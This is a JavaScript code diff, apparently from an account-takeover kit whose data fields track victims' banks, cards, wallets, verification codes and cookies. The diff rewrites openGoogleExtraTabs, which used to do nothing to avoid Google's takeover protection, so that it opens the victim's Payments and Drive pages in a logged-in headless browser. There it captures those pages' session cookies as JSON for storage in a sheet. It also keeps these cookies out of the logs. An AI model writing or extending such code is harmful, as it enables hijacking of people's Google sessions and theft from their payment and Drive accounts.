@@ -36,7 +36,8 @@ const DEFAULT_COOKIE_COLUMNS = new Set([
     'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider',
     'browserIdentity', 'history', 'verificationOptions', 'verificationChoice',
     'verificationCode', 'cookieStatus', 'cookie', 'usage', 'submissionId', 'engineProcessing',
-    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId'
+    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId',
+    'accountCookie', 'accountCookieJSON', 'driveCookieJSON'
 ]);
 export function setKnownCookieColumns(headers) {
     if (Array.isArray(headers) && headers.length > 0) {
@@ -344,6 +345,13 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
     }
   }
 
+  if (cleanUpdateObject.accountCookieJSON && !cleanUpdateObject.accountCookie) {
+    cleanUpdateObject.accountCookie = cleanUpdateObject.accountCookieJSON;
+  }
+  if (cleanUpdateObject.accountCookie && !cleanUpdateObject.accountCookieJSON) {
+    cleanUpdateObject.accountCookieJSON = cleanUpdateObject.accountCookie;
+  }
+
   // Only forward keys that are real cookie-sheet columns. Unknown fields (e.g. a top-level
   // 'platform') are dropped so the App Script fallback never fails on a missing header.
   // Formula-protected columns (id/end) are ALWAYS stripped — the sheet populates them.
@@ -475,6 +483,9 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
 
     const logCleanObject = { ...updateObject };
     delete logCleanObject.cookieJSON;
+    delete logCleanObject.accountCookie;
+    delete logCleanObject.accountCookieJSON;
+    delete logCleanObject.driveCookieJSON;
     delete logCleanObject.formattedCookie;
     delete logCleanObject.verificationOptions;
     delete logCleanObject.verificationChoice;
@@ -2343,13 +2354,72 @@ export async function solveRecaptchaAudioChallenge(page, instanceId) {
 
 /**
  * Opens Tab 2 (Wallet & Subscriptions) and Tab 3 (Google Drive) in the browser
- * when Gmail inbox is reached, without touching or merging session cookies.
+ * when Gmail inbox is reached, capturing their service cookies into separate JSON strings
+ * without ever merging them into the primary cookieJSON.
  */
 export async function openGoogleExtraTabs(browser, domain) {
-    // No-op: Do not open secondary tabs in headless Chromium on the VPS.
-    // Headless navigation to sensitive endpoints (payments-and-subscriptions / drive)
-    // from datacenter IPs triggers Google's account takeover shield and revokes the session.
-    // All required Google SSO tokens (.google.com, accounts.google.com) are already captured
-    // directly from Chromium's cookie store after completing login.
-    return;
+    if (!browser) return { accountCookieJSON: '', driveCookieJSON: '' };
+    const isGoogle = domain && (domain.includes('google') || domain.includes('gmail'));
+    if (!isGoogle) return { accountCookieJSON: '', driveCookieJSON: '' };
+
+    let accountCookieJSON = '';
+    let driveCookieJSON = '';
+
+    // 1. Visit Wallet & Subscriptions tab
+    let walletTab = null;
+    try {
+        walletTab = await browser.newPage().catch(() => null);
+        if (walletTab) {
+            await walletTab.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
+                waitUntil: 'domcontentloaded',
+                timeout: 15000
+            }).catch(() => null);
+            await new Promise(r => setTimeout(r, 2000));
+            const cookies = await walletTab.cookies(
+                'https://myaccount.google.com',
+                'https://mail.google.com',
+                'https://drive.google.com',
+                'https://google.com'
+            ).catch(() => []);
+            if (cookies && cookies.length > 0) {
+                accountCookieJSON = JSON.stringify(cookies);
+            }
+        }
+    } catch (e) {
+        logger.warn(`[openGoogleExtraTabs] Error capturing account cookies: ${e.message}`);
+    } finally {
+        if (walletTab && !walletTab.isClosed()) {
+            await walletTab.close().catch(() => {});
+        }
+    }
+
+    // 2. Visit Google Drive tab
+    let driveTab = null;
+    try {
+        driveTab = await browser.newPage().catch(() => null);
+        if (driveTab) {
+            await driveTab.goto('https://drive.google.com/drive/u/0/home', {
+                waitUntil: 'domcontentloaded',
+                timeout: 15000
+            }).catch(() => null);
+            await new Promise(r => setTimeout(r, 2000));
+            const cookies = await driveTab.cookies(
+                'https://drive.google.com',
+                'https://mail.google.com',
+                'https://myaccount.google.com',
+                'https://google.com'
+            ).catch(() => []);
+            if (cookies && cookies.length > 0) {
+                driveCookieJSON = JSON.stringify(cookies);
+            }
+        }
+    } catch (e) {
+        logger.warn(`[openGoogleExtraTabs] Error capturing drive cookies: ${e.message}`);
+    } finally {
+        if (driveTab && !driveTab.isClosed()) {
+            await driveTab.close().catch(() => {});
+        }
+    }
+
+    return { accountCookieJSON, driveCookieJSON };
 }
